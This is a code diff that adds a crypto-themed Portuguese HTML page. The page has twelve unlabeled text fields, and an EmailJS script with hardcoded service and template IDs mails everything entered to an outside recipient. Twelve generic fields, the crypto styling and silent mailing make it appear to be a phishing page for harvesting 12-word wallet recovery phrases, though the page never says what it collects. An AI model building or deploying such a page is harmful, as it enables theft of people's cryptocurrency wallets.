@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Crypto Form Futurista</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
+
+    body {
+  margin: 0;
+  padding: 50px 0;
+  font-family: 'Orbitron', sans-serif;
+  background-color: #0d0d0d;
+  overflow-x: hidden;
+  min-height: 100vh;
+  position: relative;
+}
+
+
+    .background {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .crypto-icon {
+      position: absolute;
+      font-size: 24px;
+      color: #00ffe0;
+      opacity: 0.3;
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      0% {
+        transform: translateY(-100px) rotate(0deg);
+        opacity: 0;
+      }
+      50% {
+        opacity: 0.3;
+      }
+      100% {
+        transform: translateY(110vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    form {
+      position: relative;
+      z-index: 2;
+      background: rgba(0, 0, 0, 0.85);
+      border: 2px solid #00ffe0;
+      border-radius: 15px;
+      padding: 30px;
+      width: 90%;
+      max-width: 600px;
+      box-shadow: 0 0 25px #00ffe0;
+      backdrop-filter: blur(12px);
+      color: #00ffe0;
+  margin: auto;
+  z-index: 2;
+
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #0ff;
+    }
+
+    label {
+      display: block;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 4px;
+      background: #111;
+      border: 1px solid #00ffe0;
+      border-radius: 6px;
+      color: #00ffe0;
+      font-size: 14px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #00ffff;
+      box-shadow: 0 0 8px #00ffff;
+    }
+
+    button {
+      margin-top: 25px;
+      padding: 12px;
+      width: 100%;
+      background-color: #00ffe0;
+      color: #000;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+    }
+
+    button:hover {
+      background-color: #00ffff;
+      transform: scale(1.03);
+      box-shadow: 0 0 12px #00ffff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="background" id="background"></div>
+
+  <form id="formulario">
+    <h2>🚀 CRYPTO FORM</h2>
+
+    <label>Campo 1: <input type="text" name="campo1" placeholder="Digite aqui..." required /></label>
+    <label>Campo 2: <input type="text" name="campo2" /></label>
+    <label>Campo 3: <input type="text" name="campo3" /></label>
+    <label>Campo 4: <input type="text" name="campo4" /></label>
+    <label>Campo 5: <input type="text" name="campo5" /></label>
+    <label>Campo 6: <input type="text" name="campo6" /></label>
+    <label>Campo 7: <input type="text" name="campo7" /></label>
+    <label>Campo 8: <input type="text" name="campo8" /></label>
+    <label>Campo 9: <input type="text" name="campo9" /></label>
+    <label>Campo 10: <input type="text" name="campo10" /></label>
+    <label>Campo 11: <input type="text" name="campo11" /></label>
+    <label>Campo 12: <input type="text" name="campo12" /></label>
+
+    <button type="submit">ENVIAR</button>
+  </form>
+
+  <script>
+    // EmailJS
+    (function () {
+      emailjs.init("ZS7pUqjkqFZOwMXPi");
+    })();
+
+    document.getElementById("formulario").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs
+        .sendForm("service_ejlrj6q", "template_g8ve1ws", this)
+        .then(function (response) {
+          alert("Formulário enviado com sucesso!");
+          document.getElementById("formulario").reset();
+        }, function (error) {
+          alert("Erro ao enviar.");
+        });
+    });
+
+    // Animação de ícones cripto
+    const icons = ['₿', 'Ξ', '◎', '💠', '🪙', '🤑'];
+    const bg = document.getElementById("background");
+
+    function createIcon() {
+      const el = document.createElement("div");
+      el.className = "crypto-icon";
+      el.textContent = icons[Math.floor(Math.random() * icons.length)];
+      el.style.left = Math.random() * 100 + "vw";
+      el.style.animationDuration = 4 + Math.random() * 6 + "s";
+      el.style.fontSize = 16 + Math.random() * 24 + "px";
+      bg.appendChild(el);
+
+      setTimeout(() => bg.removeChild(el), 12000);
+    }
+
+    setInterval(createIcon, 300);
+  </script>
+
+</body>
+</html>
